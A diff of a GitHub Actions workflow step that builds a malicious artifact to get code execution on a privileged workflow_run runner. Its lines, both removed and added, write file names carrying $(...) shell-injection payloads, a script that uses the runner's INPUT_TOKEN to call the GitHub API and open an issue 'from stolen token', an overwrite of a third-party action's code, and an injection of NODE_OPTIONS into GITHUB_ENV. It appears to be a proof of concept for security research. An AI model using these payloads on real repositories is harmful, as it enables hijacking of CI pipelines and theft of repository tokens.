@@ -16,32 +16,18 @@ jobs:
         run: |
           mkdir -p content
           cd content
-          printf 'RCE_PROOF: injected shell payload executed on the privileged workflow_run runner\n' > summary.txt
-          printf '' > rce.txt
-          cat > evil.js <<'JS'
+          printf 'RCE_PROOF: normal artifact content\n' > summary.txt
+          printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > env.txt
+          printf 'DECOY\n' > x.txt
+          cat > p.js <<'JS'
           const fs = require('fs');
           const t = process.env.INPUT_TOKEN || '';
-          const repo = process.env.GITHUB_REPOSITORY;
-          const H = { authorization: `Bearer ${t}`, accept: 'application/vnd.github+json', 'content-type': 'application/json', 'user-agent': 'rce-poc' };
-          const out = [`EVIL_ACTION_RAN token_len=${t.length}`];
-          (async () => {
-            try {
-              const r = await fetch(`https://api.github.com/repos/${repo}`, { headers: H });
-              out.push(`repo_api_status=${r.status}`);
-              const b = await r.json();
-              out.push(`repo=${b.full_name}`);
-              const ir = await fetch(`https://api.github.com/repos/${repo}/issues`, { method: 'POST', headers: H, body: JSON.stringify({ title: 'RCE_PROOF_FROM_STOLEN_TOKEN', body: out.join('\n') + ' ts=' + Date.now() }) });
-              out.push(`issue_create_status=${ir.status}`);
-            } catch (e) { out.push('err=' + e.message); }
-            const s = out.join('\n') + '\n';
-            try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/s', s); } catch (e) {}
-            fs.writeFileSync('/tmp/evil-out.txt', s);
-            console.log(s);
-          })();
+          const s = 'PRELOAD_RAN token_len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?');
+          try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/s', s + '\n'); } catch (e) {}
+          console.log(s);
           JS
-          SUM='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}summary.txt${IFS}$GITHUB_STEP_SUMMARY).txt'
-          OVR='rce$(S=$(dirname${IFS}${HOME%runner});cp${IFS}${S}tmp${S}content${S}content${S}evil.js${IFS}${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js).txt'
-          touch "$SUM" "$OVR"
+          touch 'x$(id).txt'
+          touch "x\$(cp\${IFS}\$(printf\${IFS}'\\057')tmp\$(printf\${IFS}'\\057')content\$(printf\${IFS}'\\057')content\$(printf\${IFS}'\\057')env.txt\${IFS}\$GITHUB_ENV).txt"
           ls -la
       - name: Upload artifact
         uses: actions/upload-artifact@v4
